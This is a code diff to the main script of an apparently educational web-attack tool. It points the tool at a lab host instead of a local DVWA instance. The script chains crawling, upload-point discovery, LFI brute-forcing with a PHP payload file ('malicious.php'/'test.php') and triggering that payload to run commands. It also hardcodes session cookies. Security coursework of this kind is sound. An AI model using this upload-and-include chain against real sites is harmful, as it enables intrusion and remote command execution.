@@ -8,14 +8,14 @@ import lfi
 import uploadv2
 
 # Fictional Company
-# URL = "http://ict2214p1b2.mooo.com/"
-# COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
-# PAYLOAD_FILENAME = "test.php"
+URL = "http://ict2214p1b2.mooo.com/"
+COOKIE = {"PHPSESSID": "9amrgdojgjebidiqqse4c5jpsr"}
+payload_filenames = ["test.php"]
 
 # DVWA
-URL = "http://127.0.0.1/DVWA/"
-COOKIE = {"PHPSESSID": "592650b8ta6dts0u0orun6jj25", "security": "medium"}
-PAYLOAD_FILENAME = "malicious.php"
+# URL = "http://127.0.0.1/DVWA/"
+# COOKIE = {"PHPSESSID": "592650b8ta6dts0u0orun6jj25", "security": "medium"}
+# payload_filenames = ["malicious.php"]
 
 # UPLOAD_DIR = f"{URL}hackable/uploads/"
 UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
@@ -61,10 +61,10 @@ def main():
     print("\nUploadable URLs:")
     for url in uploadable_urls:
         print("[+] " + url)
+
     print("\nPotential LFI vulnerabilities:")
     lfi_targets = crawler.check_lfi(found_urls)
 
-    # Need to add for LFI
     lfi_confirmed_targets = set()
     for target in lfi_targets:
         print(target)
@@ -88,7 +88,7 @@ def main():
     # dynamic_upload_dir = uploadv2.get_upload_directory(
     #     URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE
     # )
-    # # print(f"Dynamic Upload URL: {dynamic_upload_url}")
+    # print(f"Dynamic Upload URL: {dynamic_upload_url}")
     # print(f"Dynamic Upload Directory: {dynamic_upload_dir}")
 
     # # Upload the payload using the dynamic endpoint
@@ -98,16 +98,21 @@ def main():
     # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
     # print(f"[+] Direct file URL (if accessible): {direct_file_url}")
 
-    # Need to add for LFI
     # --- LFI Brute Force Phase ---
     lfi_found_url = None
     for target in lfi_confirmed_targets:
         print("Brute forcing LFI now")
-        lfi_found_url = lfi.brute_force_lfi(target, PAYLOAD_FILENAME, success_indicator, failure_indicator, session, COOKIE)
+        lfi_found_url = lfi.brute_force_lfi(
+            target,
+            payload_filenames,
+            success_indicator,
+            failure_indicator,
+            session,
+            COOKIE,
+        )
         if lfi_found_url:
             break
 
-    # Need to add for LFI
     # --- Trigger Payload Phase ---
     if lfi_found_url:
         command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
